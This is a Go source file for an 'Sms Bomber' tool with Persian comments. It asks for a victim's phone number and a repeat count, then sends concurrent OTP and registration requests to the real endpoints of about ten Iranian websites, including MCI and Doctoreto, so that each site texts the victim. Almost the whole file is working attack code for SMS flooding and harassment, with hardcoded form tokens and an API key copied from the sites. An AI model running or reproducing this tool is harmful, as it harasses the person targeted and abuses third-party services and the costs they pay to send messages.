package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io" // برای خواندن بدنه پاسخ
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"net/http/cookiejar"
)

// Code by @monsmain - Modified by Coding Partner

// --- توابع کمکی برای فرمت شماره تلفن ---
func formatPhoneWithSpaces(p string) string {
	p = getPhoneNumberNoZero(p)
	if len(p) >= 10 {
		return p[0:3] + " " + p[3:6] + " " + p[6:10]
	}
	return p
}

func getPhoneNumberNoZero(phone string) string {
	if strings.HasPrefix(phone, "0") {
		return phone[1:]
	}
	return phone
}

func getPhoneNumber98NoZero(phone string) string {
	return "98" + getPhoneNumberNoZero(phone)
}

func getPhoneNumberPlus98NoZero(phone string) string {
	return "+98" + getPhoneNumberNoZero(phone)
}

// --- تابع کمکی ساده برای شبیه سازی ternary operator در Go ---
func ternary(condition bool, trueVal, falseVal string) string {
	if condition {
		return trueVal
	}
	return falseVal
}

// --- توابع ارسال درخواست (با امضای جدید و بخش دیباگ بدنه) ---
func sendJSONRequest(client *http.Client, ctx context.Context, serviceName, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second
	const bodyReadLimit = 500 // حداکثر تعداد بایت برای خواندن از بدنه پاسخ

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s (%s) canceled.\033[0m\n", serviceName, url)
			ch <- 0
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s (%s) on retry %d: %v\033[0m\n", serviceName, url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s (%s) on retry %d: %v\033[0m\n", serviceName, url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s (%s) on retry %d: %v. Retrying...\033[0m\n", serviceName, url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s (%s) due to network error.\033[0m\n", serviceName, url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s (%s) canceled.\033[0m\n", serviceName, url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s (%s) on retry %d: %v\033[0m\n", serviceName, url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		// --- بخش اضافه شده برای دیباگ ---
		if resp.StatusCode < 400 && resp.StatusCode != 0 {
            // از io.LimitReader استفاده می کنیم تا فقط مقدار مشخصی خوانده شود
            limitedReader := io.LimitReader(resp.Body, bodyReadLimit)
			bodyBytes, readErr := io.ReadAll(limitedReader)
			// اگر خطایی غیر از EOF (پایان فایل) رخ داد
			if readErr != nil && readErr != io.EOF {
				fmt.Printf("\033[01;31m[-] Error reading body for %s (%s): %v\033[0m\n", serviceName, url, readErr)
			} else {
                // بررسی می کنیم آیا به limit رسیدیم که یعنی بدنه اصلی بزرگتر بوده
                isTruncated := readErr == nil && len(bodyBytes) == bodyReadLimit
                bodyString := string(bodyBytes)
				fmt.Printf("\033[01;36m[DEBUG Body - %s] Status: %d, Body Snippet (%d bytes%s): %s\033[0m\n",
					serviceName, resp.StatusCode, len(bodyBytes), ternary(isTruncated, "+", ""), bodyString)
			}
		}
		// --- پایان بخش اضافه شده ---


		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}

func sendFormRequest(client *http.Client, ctx context.Context, serviceName, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 3 * time.Second
	const bodyReadLimit = 500 // حداکثر تعداد بایت برای خواندن از بدنه پاسخ


	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s (%s) canceled.\033[0m\n", serviceName, url)
			ch <- 0
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s (%s) on retry %d: %v\033[0m\n", serviceName, url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := client.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s (%s) on retry %d: %v. Retrying...\033[0m\n", serviceName, url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s (%s) due to network error.\033[0m\n", serviceName, url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s (%s) canceled.\033[0m\n", serviceName, url)
				ch <- 0
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s (%s) on retry %d: %v\033[0m\n", serviceName, url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		// --- بخش اضافه شده برای دیباگ ---
		if resp.StatusCode < 400 && resp.StatusCode != 0 {
            limitedReader := io.LimitReader(resp.Body, bodyReadLimit)
			bodyBytes, readErr := io.ReadAll(limitedReader)
			if readErr != nil && readErr != io.EOF {
				fmt.Printf("\033[01;31m[-] Error reading body for %s (%s): %v\033[0m\n", serviceName, url, readErr)
			} else {
                isTruncated := readErr == nil && len(bodyBytes) == bodyReadLimit
                bodyString := string(bodyBytes)
				fmt.Printf("\033[01;36m[DEBUG Body - %s] Status: %d, Body Snippet (%d bytes%s): %s\033[0m\n",
					serviceName, resp.StatusCode, len(bodyBytes), ternary(isTruncated, "+", ""), bodyString)
			}
		}
		// --- پایان بخش اضافه شده ---

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}

func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second // کمی کمتر از POST برای GET

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil) // متد GET و Body = nil
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		// GET requests usually don't have significant bodies for this type of debug, skip body read

		ch <- resp.StatusCode
		resp.Body.Close()
		return // موفقیت آمیز بود، از حلقه تلاش مجدد خارج می شویم
	}
}


// --- تابع اصلی (با فراخوانی های اصلاح شده) ---
func main() {
	clearScreen()

	// لوگو و اطلاعات اولیه (بدون تغییر)
	fmt.Print("\033[01;32m")
	fmt.Print(`
		:-.
	.: =#-:-
  **%@#%@@@#*+==:
:=*%@@@@@@@@@@@@@@%#*=:
-*%@@@@@@@@@@@@@@@@@@@@@@@%#=.
. -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:
.= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.
=% .#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:
:%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.
#@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..
.%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
	=@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
	+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
	=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-
	.%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
	 #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#
	 -@@@@*: . -#@@@@@@#: . -#@@@%:
	 *@@%# #@@@@@@. #@@@+
	 .%@@# @monsmain +@@@@@@= Sms Bomber #@@#
	:@@* =%@@@@@@%- faster *@@:
	 #@@% .*%@@@@#%@@@%+. %@@+
	 %@@@+ -#@@@@@* :%@@@@@*- *@@@*
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
	*@@@@#++*#%@@@@@@+ #@@@@@@%#+++%@@@@=
	  #@@@@@@@@@@@@@@* Go #@@@@@@@@@@@@@@*
	 =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-
	   .---@@@@@@@@@%@@@%%@@@@@@@@%:--.
	   #@@@@@@@@@@@@@@@@@@@@@@+
	   *@@@@@@@@@@@@@@@@@@@@@@+
	   +@@%*@@%@@@%%@%*@@%=
	   +%+ %%.+@%:-@* *%-
		. %# .%# %+
		 :. %+ :.
		  -:
`)
	fmt.Print("\033[0m")

	// تعداد کل سرویس هایی که اضافه می کنیم
	numberOfServices := 1 + 12 // MCIShop + 12 سرویس جدید
	fmt.Printf("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m%d\n", numberOfServices)
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n") // این عدد 6 ثابت باقی مانده

	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int
	switch strings.ToLower(speedChoice) {
	case "fast":
		numWorkers = 90
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":
		numWorkers = 40
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:
		numWorkers = 40
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}

	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel() // ارسال سیگنال لغو به Context
	}()

	cookieJar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar:     cookieJar,
		Timeout: 10 * time.Second, // Timeout برای هر درخواست
	}

	// اندازه کانال Task به تعداد کل درخواست ها (تعداد تکرار * تعداد سرویس ها)
	totalRequests := repeatCount * numberOfServices
	tasks := make(chan func(), totalRequests)
	ch := make(chan int, totalRequests) // کانال نتیجه هم به همین اندازه و از نوع int باقی می ماند

	var wg sync.WaitGroup

	// راه اندازی Worker Pool (بدون تغییر)
	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	// اضافه کردن Task ها به کانال tasks
	for i := 0; i < repeatCount; i++ {

		// --- سرویس 1: MCIShop ---
		wg.Add(1)
		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
			return func() {
				payload := map[string]interface{}{
					"msisdn": originalPhone, // فرمت 09... (شماره ورودی خام)
				}
                // فراخوانی با اضافه کردن نام سرویس در جای درست
				sendJSONRequest(c, ctx, "MCIShop", "https://api-ebcom.mci.ir/services/auth/v1.0/otp", payload, &wg, ch)
			}
		}(client, phone) // capture client and phone


		// --- سرویس 2: LivarFars (OTP Request) ---
		wg.Add(1)
		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
			return func() {
				formData := url.Values{
					"digt_countrycode":      {"+98"},
					"phone":                 {getPhoneNumberNoZero(originalPhone)}, // فرمت 9...
					"digits_process_register": {"1"},
					"instance_id":           {"c615328f4685ecfc0bb3378a99c1cc44"}, // توجه: احتمال داینامیک بودن
					"optional_data":         {"optional_data"},
					"action":                {"digits_forms_ajax"},
					"type":                  {"register"},
					"dig_otp":               {""},
					"digits":                {"1"},
					"digits_redirect_page":  {"//livarfars.ir/product-category/electronic-devices/wearable-gadget/?page=2&redirect_to=https%3A%2F%2Flivarfars.ir%2Fproduct-category%2Felectronic-devices%2Fwearable-gadget%2F"}, // توجه: احتمال داینامیک بودن
					"digits_form":           {"673112fec7"}, // توجه: احتمال داینامیک بودن
					"_wp_http_referer":      {"/product-category/electronic-devices/wearable-gadget/?login=true&page=2&redirect_to=https%3A%2F%2Flivarfars.ir%2Fproduct-category%2Felectronic-devices%2Fwearable-gadget%2F"}, // توجه: احتمال داینامیک بودن
				}
                 // فراخوانی با اضافه کردن نام سرویس در جای درست
				sendFormRequest(c, ctx, "LivarFars (OTP Request)", "https://livarfars.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client, phone) // capture client and phone

		// --- سرویس 3: Ashraafi (Check Phone) ---
		wg.Add(1)
		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
			return func() {
				formData := url.Values{
					"action":       {"check_phone_number"},
					"phone_number": {originalPhone}, // فرمت 09...
				}
                 // فراخوانی با اضافه کردن نام سرویس در جای درست
				sendFormRequest(c, ctx, "Ashraafi (Check)", "https://ashraafi.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client, phone) // capture client and phone

		// --- سرویس 4: Ashraafi (Send OTP) ---
		wg.Add(1)
		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
			return func() {
				formData := url.Values{
					"action":       {"send_verification_code"},
					"phone_number": {originalPhone}, // فرمت 09...
				}
                // فراخوانی با اضافه کردن نام سرویس در جای درست
				sendFormRequest(c, ctx, "Ashraafi (Send OTP)", "https://ashraafi.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client, phone) // capture client and phone

		// --- سرویس 5: Moshaveran724 (Validate) ---
		wg.Add(1)
		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
			return func() {
				formData := url.Values{
					"number": {originalPhone}, // فرمت 09...
					"cache":  {"false"},
				}
                // فراخوانی با اضافه کردن نام سرویس در جای درست
				sendFormRequest(c, ctx, "Moshaveran724 (Validate)", "https://moshaveran724.ir/m/uservalidate.php", formData, &wg, ch)
			}
		}(client, phone) // capture client and phone

		// --- سرویس 6: Moshaveran724 (PMS) ---
		wg.Add(1)
		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
			return func() {
				formData := url.Values{
					"number": {originalPhone}, // فرمت 09...
					"cache":  {"false"},
				}
                // فراخوانی با اضافه کردن نام سرویس در جای درست
				sendFormRequest(c, ctx, "Moshaveran724 (PMS)", "https://moshaveran724.ir/m/pms.php", formData, &wg, ch)
			}
		}(client, phone) // capture client and phone

		// --- سرویس 7: SimkhanAPI ---
		wg.Add(1)
		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
			return func() {
				payload := map[string]interface{}{
					"mobileNumber": originalPhone, // فرمت 09...
					"key":          "16a85bef-70be-41b2-934b-994e2aa113b7", // توجه: احتمال داینامیک بودن/کلید API
					"ReSendSMS":    false,
				}
                // فراخوانی با اضافه کردن نام سرویس در جای درست
				sendJSONRequest(c, ctx, "SimkhanAPI", "https://simkhanapi.ir/api/users/registerV2", payload, &wg, ch)
			}
		}(client, phone) // capture client and phone

		// --- سرویس 8: Pakhsh.Shop (OTP Request) ---
		wg.Add(1)
		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
			return func() {
				formData := url.Values{
					"digt_countrycode":      {"+98"},
					"phone":                 {getPhoneNumberNoZero(originalPhone)}, // فرمت 9...
					"digits_reg_name":       {"ghbfgf"}, // توجه: احتمال داینامیک بودن
					"digits_process_register": {"1"},
					"instance_id":           {"d49463434e4d494fa93e5f6a1bdcd189"}, // توجه: احتمال داینامیک بودن
					"optional_data":         {"optional_data"},
					"action":                {"digits_forms_ajax"},
					"type":                  {"register"},
					"dig_otp":               {""},
					"digits":                {"1"},
					"digits_redirect_page":  {"//pakhsh.shop/?page=1&redirect_to=https%3A%2F%2Fpakhsh.shop%2F"},
					"digits_form":           {"65ecb01c4f"}, // توجه: احتمال داینامیک بودن
					"_wp_http_referer":      {"/?login=true&page=1&redirect_to=https%3A%2F%2Fpakhsh.shop%2F"},
				}
                // فراخوانی با اضافه کردن نام سرویس در جای درست
				sendFormRequest(c, ctx, "Pakhsh.Shop (OTP Request)", "https://pakhsh.shop/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client, phone) // capture client and phone

		// --- سرویس 9: Doctoreto ---
		wg.Add(1)
		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
			return func() {
				payload := map[string]interface{}{
					"mobile":     getPhoneNumberNoZero(originalPhone), // فرمت 9...
					"country_id": 205,
					"captcha":    "", // توجه: فیلد Captcha احتمالاً لازم است
				}
                // فراخوانی با اضافه کردن نام سرویس در جای درست
				sendJSONRequest(c, ctx, "Doctoreto", "https://api.doctoreto.com/api/web/patient/v1/accounts/register", payload, &wg, ch)
			}
		}(client, phone) // capture client and phone

		// --- سرویس 10: Backend.Digify.Shop ---
		wg.Add(1)
		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
			return func() {
				payload := map[string]interface{}{
					"phone_number": originalPhone, // فرمت 09...
				}
                // فراخوانی با اضافه کردن نام سرویس در جای درست
				sendJSONRequest(c, ctx, "Backend.Digify.Shop", "https://backend.digify.shop/user/merchant/otp/", payload, &wg, ch)
			}
		}(client, phone) // capture client and phone

		// --- سرویس 13: Glite.ir ---
		wg.Add(1)
		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
			return func() {
				formData := url.Values{
					"action":         {"mreeir_send_sms"},
					"mobileemail":    {originalPhone}, // فرمت 09...
					"userisnotauser": {""},
					"type":           {"mobile"},
					"captcha":        {""},   // توجه: احتمال داینامیک بودن/لازم بودن Captcha
					"captchahash":    {""},   // توجه: احتمال داینامیک بودن Captcha Hash
					"security":       {"5881793717"}, // توجه: احتمال بسیار زیاد داینامیک بودن (Session Token?)
				}
                // فراخوانی با اضافه کردن نام سرویس در جای درست
				sendFormRequest(c, ctx, "Glite.ir", "https://www.glite.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client, phone) // capture client and phone


		// هر چند وقت یکبار چک کنید که آیا سیگنال لغو دریافت شده است یا خیر
		select {
		case <-ctx.Done():
			fmt.Println("\033[01;33m[!] Stopping task creation due to cancellation.\033[0m")
			goto endTaskCreation // خروج از حلقه های تو در تو
		default:
			// ادامه
		}
	}

endTaskCreation:
	close(tasks) // بعد از اضافه کردن همه Task ها، کانال Task را می بندیم

	// گورتین برای انتظار کشیدن برای پایان همه Task ها و بستن کانال نتیجه (بدون تغییر)
	go func() {
		wg.Wait() // انتظار برای پایان تمام Task ها
		close(ch) // بستن کانال نتیجه بعد از اتمام همه Task ها
	}()

	// خواندن نتایج از کانال نتیجه و نمایش وضعیت (بدون تغییر در منطق نمایش)
	fmt.Println("\033[01;34m[*] Finished adding tasks. Processing results...\033[0m")
	processedCount := 0
	for statusCode := range ch {
		processedCount++
		// با توجه به اینکه خروجی فقط کد وضعیت است، مشخص نیست کدام سرویس خاص موفق یا ناموفق بوده است.
		// اما خروجی DEBUG که بالاتر چاپ می شود نام سرویس را نشان می دهد.
		if statusCode >= 400 || statusCode == 0 { // 0 را برای وضعیت کنسل شده در نظر می گیریم
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			// فرض می کنیم کدهای 1xx, 2xx, 3xx موفقیت آمیز هستند یا هدایت
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}

	fmt.Printf("\033[01;34m[*] Finished processing %d results.\033[0m\n", processedCount)
}

// --- تابع clearScreen بدون تغییر می ماند ---
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}
